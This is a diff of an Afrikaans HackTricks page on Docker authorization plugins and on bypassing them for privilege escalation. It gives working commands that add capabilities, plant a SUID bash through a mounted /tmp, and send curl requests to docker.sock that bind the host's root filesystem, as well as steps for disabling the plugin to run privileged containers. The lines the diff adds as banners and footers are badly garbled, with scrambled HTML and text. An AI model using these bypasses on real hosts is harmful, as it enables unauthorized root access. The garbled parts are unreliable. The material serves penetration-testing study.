@@ -1,83 +1,88 @@
-<details>
+{% hnnt styte=" acceas" %}
+GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
+Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<dotsilp>
 
-Ander maniere om HackTricks te ondersteun:
+<oummpr>SupportHackTricks</smmay>
 
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
+* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 
-**Docker se** out-of-the-box **outorisasiemodel** is **alles of niks**. Enige gebruiker met toestemming om die Docker-daemon te gebruik, kan **enige** Docker-kliënt **opdrag** uitvoer. Dieselfde geld vir oproepers wat die Docker Engine API gebruik om die daemon te kontak. As jy **groter toegangsbeheer** benodig, kan jy **outorisasie-plugins** skep en dit by jou Docker-daemon-konfigurasie voeg. Met behulp van 'n outorisasie-plugin kan 'n Docker-administrator **fynkorrelige toegangspolisse** instel om toegang tot die Docker-daemon te bestuur.
+**Docker se** out-of-the-box **autorisering** model is **alles of niks**. Enige gebruiker met toestemming om toegang tot die Docker daemon te verkry, kan **enige** Docker kliënt **opdrag** **uitvoer**. Dieselfde geld vir oproepers wat Docker se Engine API gebruik om die daemon te kontak. As jy **groter toegangbeheer** benodig, kan jy **autorisering plugins** skep en dit by jou Docker daemon konfigurasie voeg. Met 'n autorisering plugin kan 'n Docker administrateur **fyn toegang** beleid konfigureer om toegang tot die Docker daemon te bestuur.
 
 # Basiese argitektuur
 
-Docker Auth-plugins is **eksterne plugins** wat jy kan gebruik om **aksies** wat aan die Docker Daemon gevra word, **toe te laat/weier** afhangende van die **gebruiker** wat dit gevra het en die **gevraagde aksie**.
+Docker Auth plugins is **eksterne** **plugins** wat jy kan gebruik om **toestaan/ontken** **aksies** wat aan die Docker Daemon aangevra word, **afhangende** van die **gebruiker** wat dit aangevra het en die **aksie** **aangevra**.
 
 **[Die volgende inligting is van die dokumentasie](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Wanneer 'n **HTTP-aanvraag** deur die CLI of via die Engine API na die Docker-daemon gestuur word, stuur die **outentiseringsondersteuning** die aanvraag na die geïnstalleerde **outentiseringsplugin**(s). Die aanvraag bevat die gebruiker (oproeper) en opdragkonteks. Die **plugin** is verantwoordelik vir die besluit of die aanvraag **toegelaat** of **geweier** moet word.
+Wanneer 'n **HTTP** **versoek** aan die Docker **daemon** gemaak word deur die CLI of via die Engine API, **gee** die **authentisering** **substelsel** die versoek aan die geïnstalleerde **authentisering** **plugin**(s). Die versoek bevat die gebruiker (oproeper) en opdrag konteks. Die **plugin** is verantwoordelik om te besluit of die versoek **toegestaan** of **ontken** moet word.
 
-Die volgende sekansdiagramme toon 'n toelaat- en weieringsvloei vir outorisasie:
+Die volgorde diagramme hieronder toon 'n toelaat en ontken autorisering vloei:
 
-![Toelaat-outorisasievloei](https://docs.docker.com/engine/extend/images/authz\_allow.png)
+![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![Weieringsoutorisasievloei](https://docs.docker.com/engine/extend/images/authz\_deny.png)
+![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Elke aanvraag wat na die plugin gestuur word, **bevat die geoutentiseerde gebruiker, die HTTP-koppe, en die aanvraag/antwoordliggaam**. Slegs die **gebruikersnaam** en die **outentiseringsmetode** wat gebruik is, word aan die plugin oorgedra. Belangrik is dat **geen** gebruikers **vollegetuigskrifte** of tokens oorgedra word nie. Laastens word **nie alle aanvraag/antwoordliggame** na die outorisasie-plugin gestuur nie. Slegs daardie aanvraag/antwoordliggame waar die `Content-Type` óf `text/*` óf `application/json` is, word gestuur.
+Elke versoek wat aan die plugin gestuur word, **sluit die geverifieerde gebruiker, die HTTP koptekste, en die versoek/antwoord liggaam** in. Slegs die **gebruikersnaam** en die **authentisering metode** wat gebruik is, word aan die plugin deurgegee. Die belangrikste is dat **geen** gebruikers **akkrediteer** of tokens deurgegee word nie. Laastens, **nie alle versoek/antwoord liggame word** aan die autorisering plugin gestuur nie. Slegs daardie versoek/antwoord liggame waar die `Content-Type` of `text/*` of `application/json` is, word gestuur.
 
-Vir opdragte wat die HTTP-verbinding kan oorneem (`HTTP Upgrade`), soos `exec`, word die outorisasie-plugin slegs geroep vir die aanvanklike HTTP-aanvrae. Sodra die plugin die opdrag goedkeur, word outorisasie nie op die res van die vloei toegepas nie. Spesifiek word die stroomdata nie aan die outorisasie-plugins oorgedra nie. Vir opdragte wat 'n stuksgewyse HTTP-antwoord teruggee, soos `logs` en `events`, word slegs die HTTP-aanvraag na die outorisasie-plugins gestuur.
+Vir opdragte wat moontlik die HTTP verbinding kan oorneem (`HTTP Upgrade`), soos `exec`, word die autorisering plugin slegs vir die aanvanklike HTTP versoeke aangeroep. Sodra die plugin die opdrag goedkeur, word autorisering nie op die res van die vloei toegepas nie. Spesifiek, die stroomdata word nie aan die autorisering plugins deurgegee nie. Vir opdragte wat chunked HTTP antwoord teruggee, soos `logs` en `events`, word slegs die HTTP versoek aan die autorisering plugins gestuur.
 
-Tydens die verwerking van aanvrae/antwoorde kan sommige outorisasievloei moontlik addisionele navrae aan die Docker-daemon doen. Om sulke vloei te voltooi, kan plugins die daemon API oproep soos 'n gewone gebruiker. Om sulke addisionele navrae moontlik te maak, moet die plugin die middels voorsien om 'n administrateur in staat te stel om behoorlike outentisering- en sekuriteitsbeleide te konfigureer.
+Tydens versoek/antwoord verwerking, mag sommige autorisering vloei addisionele navrae aan die Docker daemon benodig. Om sulke vloei te voltooi, kan plugins die daemon API aanroep soos 'n gewone gebruiker. Om hierdie addisionele navrae moontlik te maak, moet die plugin die middele verskaf vir 'n administrateur om behoorlike authentisering en sekuriteitsbeleide te konfigureer.
 
 ## Verskeie Plugins
 
-Jy is verantwoordelik vir die **registreer** van jou **plugin** as deel van die Docker-daemon se **beginproses**. Jy kan **verskeie plugins installeer en aanmekaar koppel**. Hierdie ketting kan georden word. Elke aanvraag aan die daemon gaan in volgorde deur die ketting. Slegs as **alle plugins toegang verleen** tot die hulpbron, word die toegang verleen.
+Jy is verantwoordelik vir **registrasie** van jou **plugin** as deel van die Docker daemon **opstart**. Jy kan **meerdere plugins installeer en dit saamketting**. Hierdie ketting kan georden word. Elke versoek aan die daemon gaan in volgorde deur die ketting. Slegs wanneer **alle plugins toegang verleen** tot die hulpbron, word die toegang verleen.
 
-# Plugin-voorbeelde
+# Plugin Voorbeelde
 
 ## Twistlock AuthZ Broker
 
-Die plugin [**authz**](https://github.com/twistlock/authz) stel jou in staat om 'n eenvoudige **JSON**-lêer te skep wat die **plugin** sal **lees** om die aanvrae te outoriseer. Dit gee jou dus die geleentheid om baie maklik te beheer watter API-eindpunte elke gebruiker kan bereik.
+Die plugin [**authz**](https://github.com/twistlock/authz) laat jou toe om 'n eenvoudige **JSON** lêer te skep wat die **plugin** sal **lees** om die versoeke te autoriseer. Daarom gee dit jou die geleentheid om baie maklik te beheer watter API eindpunte elke gebruiker kan bereik.
 
-Hier is 'n voorbeeld wat Alice en Bob in staat stel om nuwe houers te skep: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+Dit is 'n voorbeeld wat sal toelaat dat Alice en Bob nuwe houers kan skep: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-Op die bladsy [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) kan jy die verband tussen die gevraagde URL en die aksie vind. Op die bladsy [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) kan jy die verband tussen die aksienaam en die aksie vind.
+In die bladsy [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) kan jy die verhouding tussen die aangevraagde URL en die aksie vind. In die bladsy [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) kan jy die verhouding tussen die aksienaam en die aksie vind.
 
-## Eenvoudige Plugin-tutoriaal
+## Eenvoudige Plugin Handleiding
 
 Jy kan 'n **maklik verstaanbare plugin** met gedetailleerde inligting oor installasie en foutopsporing hier vind: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
-Lees die `README` en die `plugin.go`-kode om te verstaan hoe dit werk.
+Lees die `README` en die `plugin.go` kode om te verstaan hoe dit werk.
 
-# Docker Auth Plugin-omseiling
+# Docker Auth Plugin Bypass
 
-## Toegang opspoor
+## Enumereer toegang
 
-Die belangrikste dinge om te ondersoek is **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.
+Die hoofsake om te kontroleer is die **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.
 
-Om hierdie opsporing uit te voer, kan jy die instrument [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler) **gebruik**.
+Om hierdie enumerasie uit te voer, kan jy **die hulpmiddel** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
-## Verbode `run --privileged`
+## verbode `run --privileged`
 
-### Minimumvoorregte
+### Minimum Privileges
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
-### Uitvoer van 'n houer en dan 'n bevoorregte sessie kry
+### Running a container and then getting a privileged session
 
-In hierdie geval het die stelseladministrateur gebruikers verhinder om volumes te monteer en houers met die `--privileged` vlag uit te voer, of enige ekstra vermoë aan die houer te gee:
+In this case the sysadmin **het gebruikers verbied om volumes te monteer en houers met die `--privileged` vlag te draai** of enige ekstra vermoë aan die houer te gee:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-Een gebruiker kan egter **'n skulp binne die lopende houer skep en dit die ekstra voorregte gee**:
+However, a user can **create a shell inside the running container and give it the extra privileges**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -89,11 +94,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-Nou kan die gebruiker ontsnap uit die houer deur enige van die [voorheen bespreekte tegnieke](./#privileged-flag) te gebruik en voorregte binne die gasheer te verhoog.
+Nou kan die gebruiker uit die houer ontsnap deur enige van die [**voorheen bespreekte tegnieke**](./#privileged-flag) te gebruik en **privileges te verhoog** binne die gasheer.
 
-## Monteer Skryfbare Vouer
+## Monteer Skryfbare Gids
 
-In hierdie geval het die stelseladministrateur gebruikers verhoed om houers met die `--privileged` vlag te hardloop of enige ekstra vermoë aan die houer te gee, en hy het slegs toegelaat om die `/tmp` vouer te monteer:
+In hierdie geval het die stelselaanvaarder **gebruikers verbied om houers met die `--privileged` vlag te laat loop** of enige ekstra vermoë aan die houer te gee, en hy het slegs toegelaat om die `/tmp` gids te monteer:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -103,25 +108,25 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 {% hint style="info" %}
-Let daarop dat jy dalk nie die `/tmp`-vouer kan koppel nie, maar jy kan 'n **ander skryfbare vouer** koppel. Jy kan skryfbare gidslys vind deur die volgende te gebruik: `find / -writable -type d 2>/dev/null`
+Let daarop dat jy dalk nie die gids `/tmp` kan monteer nie, maar jy kan 'n **ander skryfbare gids** monteer. Jy kan skryfbare gidse vind met: `find / -writable -type d 2>/dev/null`
 
-**Let daarop dat nie alle gidslysies in 'n Linux-masjien die suid-bit sal ondersteun nie!** Om te bepaal watter gidslysies die suid-bit ondersteun, voer jy `mount | grep -v "nosuid"` uit. Byvoorbeeld, gewoonlik ondersteun `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` en `/var/lib/lxcfs` nie die suid-bit nie.
+**Let daarop dat nie al die gidse in 'n linux masjien die suid bit sal ondersteun nie!** Om te kyk watter gidse die suid bit ondersteun, voer `mount | grep -v "nosuid"` uit. Byvoorbeeld, gewoonlik ondersteun `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` en `/var/lib/lxcfs` nie die suid bit nie.
 
-Let ook daarop dat as jy `/etc` of enige ander vouer **wat konfigurasie-lêers bevat** kan koppel, jy dit as root vanuit die Docker-houer kan wysig om **privileges te verhoog** (dalk deur `/etc/shadow` te wysig).
+Let ook daarop dat as jy **`/etc`** of enige ander gids **wat konfigurasie lêers bevat**, kan **monteer**, jy dit as root vanuit die docker houer kan verander om dit te **misbruik in die gasheer** en voorregte te verhoog (miskien deur `/etc/shadow` te wysig).
 {% endhint %}
 
-## Ongekontroleerde API-eindpunt
+## Onbeheerde API Eindpunt
 
-Die verantwoordelikheid van die stelseladministrateur wat hierdie invoegtoepassing konfigureer, sou wees om te beheer watter aksies en met watter bevoegdhede elke gebruiker kan uitvoer. Daarom, as die administrateur 'n **swartlys**-benadering volg met die eindpunte en die eienskappe, kan hy dalk sommige daarvan **vergeet** wat 'n aanvaller in staat sou stel om **privileges te verhoog**.
+Die verantwoordelikheid van die sysadmin wat hierdie plugin konfigureer, sal wees om te beheer watter aksies en met watter voorregte elke gebruiker kan uitvoer. Daarom, as die admin 'n **swartlys** benadering met die eindpunte en die eienskappe neem, mag hy dalk **van sommige daarvan vergeet** wat 'n aanvaller kan toelaat om **voorregte te verhoog.**
 
-Jy kan die Docker API nagaan by [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Jy kan die docker API nagaan in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
-## Ongekontroleerde JSON-Struktuur
+## Onbeheerde JSON Struktuur
 
-### Bind in die wortel
+### Bindings in root
 
-Dit is moontlik dat die stelseladministrateur, toe hy die Docker-firewall gekonfigureer het, 'n belangrike parameter van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Binds**" **vergeet** het.\
-In die volgende voorbeeld is dit moontlik om van hierdie konfigurasiefout gebruik te maak om 'n houer te skep en uit te voer wat die wortel (/) vouer van die gasheer koppel:
+Dit is moontlik dat toe die sysadmin die docker vuurmuur gekonfigureer het, hy **van 'n belangrike parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Bindings**" **vergeet het**.\
+In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer te skep en te laat loop wat die root (/) gids van die gasheer monteer:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -132,30 +137,30 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 {% hint style="warning" %}
-Let daarop hoe ons in hierdie voorbeeld die **`Binds`** param gebruik as 'n sleutel op die hoofvlak in die JSON, maar in die API verskyn dit onder die sleutel **`HostConfig`**
+Let op hoe ons in hierdie voorbeeld die **`Binds`** parameter as 'n wortelvlak sleutel in die JSON gebruik, maar in die API verskyn dit onder die sleutel **`HostConfig`**
 {% endhint %}
 
 ### Binds in HostConfig
 
-Volg dieselfde instruksies soos met **Binds in root** deur hierdie **versoek** na die Docker API te doen:
+Volg dieselfde instruksies as met **Binds in root** deur hierdie **aanvraag** aan die Docker API te doen:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-### Monteerings in die wortel
+### Mounts in root
 
-Volg dieselfde instruksies soos met **Bind in die wortel** deur hierdie **versoek** na die Docker API uit te voer:
+Volg dieselfde instruksies as met **Binds in root** deur hierdie **versoek** aan die Docker API te doen:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-### Monteer in HostConfig
+### Mounts in HostConfig
 
-Volg dieselfde instruksies soos met **Binds in root** deur hierdie **versoek** na die Docker API te doen:
+Volg dieselfde instruksies as met **Binds in root** deur hierdie **versoek** aan die Docker API te doen:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-## Ongekontroleerde JSON-attribuut
+## Ongeëvalueerde JSON Attribuut
 
-Dit is moontlik dat toe die stelseladministrateur die docker-firewall gekonfigureer het, hy **vergeet het van 'n belangrike attribuut van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**". In die volgende voorbeeld is dit moontlik om van hierdie verkeerde konfigurasie misbruik te maak om 'n houer met die **SYS\_MODULE**-vermoë te skep en uit te voer:
+Dit is moontlik dat toe die stelselaanpasser die docker-vuurmuur gekonfigureer het, hy **vergeet het van 'n belangrike attribuut van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**". In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer met die **SYS\_MODULE** vermoë te skep en te laat loop:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -166,12 +171,12 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 {% hint style="info" %}
-Die **`HostConfig`** is die sleutel wat gewoonlik die **interessante** **voorregte** bevat om uit die houer te ontsnap. Let egter daarop dat die gebruik van Binds buite dit ook werk en jou mag toelaat om beperkings te omseil.
+Die **`HostConfig`** is die sleutel wat gewoonlik die **interessante** **privileges** bevat om uit die houer te ontsnap. Dit is egter belangrik om te noem, soos ons voorheen bespreek het, dat die gebruik van Binds buite dit ook werk en jou mag toelaat om beperkings te omseil.
 {% endhint %}
 
-## Plugin Deaktivering
+## Deaktiveer Plugin
 
-As die **sysadmin** die vermoë om die **plugin** te **deaktiveer** vergeet het, kan jy hiervan gebruik maak om dit heeltemal te deaktiveer!
+As die **sisteemadministrateur** **vergeet** het om die vermoë om die **plugin** te **deaktiveer**, kan jy hiervan voordeel trek om dit heeltemal te deaktiveer!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -183,27 +188,32 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-Onthou om die invoegtoepassing **weer te aktiveer nadat jy toegang verkry het**, anders sal 'n **herlaai van die docker-diens nie werk nie**!
+Remember to **heraktiveer die plugin na die eskalering**, of 'n **herbegin van die docker diens sal nie werk nie**!
 
-## Auth Plugin Bypass writeups
+## Auth Plugin Bypass skrywes
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
 ## Verwysings
+{% hnt stye="acceas" %}
+AWS Ha& praktyk ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
+Leer & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
 
-* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
+<dtil>
 
+<ummr>SupportHackTricks</smmay>
 
-<details>
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
+* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
-
+{% endhint %}
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
